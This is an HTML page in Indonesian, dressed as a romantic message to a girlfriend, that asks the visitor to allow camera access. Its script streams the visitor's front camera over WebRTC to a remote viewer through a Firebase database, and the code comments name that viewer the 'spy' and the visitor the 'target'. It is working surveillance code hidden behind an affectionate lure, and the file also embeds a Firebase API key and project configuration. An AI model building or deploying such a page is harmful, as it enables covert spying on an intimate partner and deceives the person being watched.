<!DOCTYPE html>
<html>
<head>
    <title>ðŸ’Œ Untuk Pacarku</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #ff6b9d, #ff8e53);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 20px;
            padding: 30px;
            width: 100%;
            max-width: 500px;
            text-align: center;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        h1 { color: #ff4081; margin-bottom: 20px; }
        #status { margin: 20px 0; min-height: 24px; }
        #video { width: 100%; border-radius: 10px; margin: 20px 0; display: none; }
        #roomId { 
            background: #f0f0f0; 
            padding: 10px; 
            border-radius: 5px; 
            margin: 10px 0;
            font-family: monospace;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>ðŸ’– Untuk Pacarku</h1>
        <p>Sayang, izinkan aku melihat senyuman indahmu...</p>
        
        <button id="startBtn" onclick="startCamera()">ðŸ“¸ Izinkan Kamera</button>
        
        <div id="status"></div>
        
        <div id="roomId"></div>
        
        <video id="video" autoplay playsinline muted></video>
    </div>

    <!-- FIREBASE v8 (STABLE VERSION) -->
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    
    <script>
        // ========== CONFIG ==========
        const firebaseConfig = {
            apiKey: "AIzaSyBYW92p7arkxHse0Lo3z6xoe_7G43vHBRU",
            authDomain: "survei-f11a1.firebaseapp.com",
            databaseURL: "https://survei-f11a1-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "survei-f11a1",
            storageBucket: "survei-f11a1.firebasestorage.app",
            messagingSenderId: "769641850914",
            appId: "1:769641850914:web:3be7b2cf7f6cb09ab9427b"
        };
        
        // ========== INIT ==========
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();
        
        // ========== VARIABLES ==========
        let localStream;
        let peerConnection;
        let roomId;
        let offerListener;
        let candidateListener;
        
        // ========== START CAMERA ==========
        async function startCamera() {
            const btn = document.getElementById('startBtn');
            const status = document.getElementById('status');
            
            btn.disabled = true;
            btn.textContent = "ðŸ”„ Memulai...";
            
            try {
                // 1. GET CAMERA
                localStream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: "user", width: 640, height: 480 },
                    audio: false
                });
                
                const video = document.getElementById('video');
                video.srcObject = localStream;
                video.style.display = 'block';
                video.style.transform = 'scaleX(-1)';
                
                // 2. CREATE ROOM
                roomId = generateRoomId();
                document.getElementById('roomId').style.display = 'block';
                document.getElementById('roomId').textContent = `Kode: ${roomId}`;
                
                // Clean old room data
                await database.ref('rooms/' + roomId).remove();
                
                // 3. SETUP WEBRTC
                setupWebRTC();
                
                // 4. SETUP LISTENERS
                setupListeners();
                
                status.innerHTML = "âœ… Kamera aktif! Beri kode ini ke pacarmu:";
                
            } catch (error) {
                status.innerHTML = `âŒ Error: ${error.message}`;
                btn.disabled = false;
                btn.textContent = "ðŸ”„ Coba Lagi";
            }
        }
        
        // ========== WEBRTC SETUP ==========
        function setupWebRTC() {
            peerConnection = new RTCPeerConnection({
                iceServers: [
                    { urls: 'stun:stun.l.google.com:19302' },
                    { urls: 'stun:stun1.l.google.com:19302' }
                ]
            });
            
            // Add local stream
            localStream.getTracks().forEach(track => {
                peerConnection.addTrack(track, localStream);
            });
            
            // ICE candidate handler
            peerConnection.onicecandidate = (event) => {
                if (event.candidate) {
                    database.ref(`rooms/${roomId}/targetCandidates`).push(event.candidate.toJSON());
                }
            };
        }
        
        // ========== SETUP LISTENERS ==========
        function setupListeners() {
            // Listen for spy's offer
            offerListener = database.ref(`rooms/${roomId}/offer`).on('value', async (snapshot) => {
                const offer = snapshot.val();
                if (offer && peerConnection.signalingState === 'stable') {
                    console.log("ðŸ“¥ Received offer");
                    
                    await peerConnection.setRemoteDescription(new RTCSessionDescription(offer));
                    
                    const answer = await peerConnection.createAnswer();
                    await peerConnection.setLocalDescription(answer);
                    
                    // Send answer
                    await database.ref(`rooms/${roomId}/answer`).set(answer);
                    
                    document.getElementById('status').innerHTML = "ðŸ”´ Terhubung dengan pacar!";
                }
            });
            
            // Listen for spy's ICE candidates
            candidateListener = database.ref(`rooms/${roomId}/spyCandidates`).on('child_added', async (snapshot) => {
                const candidate = snapshot.val();
                if (candidate) {
                    try {
                        await peerConnection.addIceCandidate(new RTCIceCandidate(candidate));
                    } catch (e) {
                        console.warn("Failed to add ICE candidate:", e);
                    }
                }
            });
        }
        
        // ========== UTILS ==========
        function generateRoomId() {
            return Math.random().toString(36).substring(2, 10).toUpperCase();
        }
        
        // ========== CLEANUP ==========
        function cleanup() {
            if (offerListener) database.ref(`rooms/${roomId}/offer`).off('value', offerListener);
            if (candidateListener) database.ref(`rooms/${roomId}/spyCandidates`).off('child_added', candidateListener);
            if (localStream) localStream.getTracks().forEach(track => track.stop());
            if (peerConnection) peerConnection.close();
            if (roomId) database.ref('rooms/' + roomId).remove();
        }
        
        window.addEventListener('beforeunload', cleanup);
        window.addEventListener('pagehide', cleanup);
    </script>
</body>
</html>
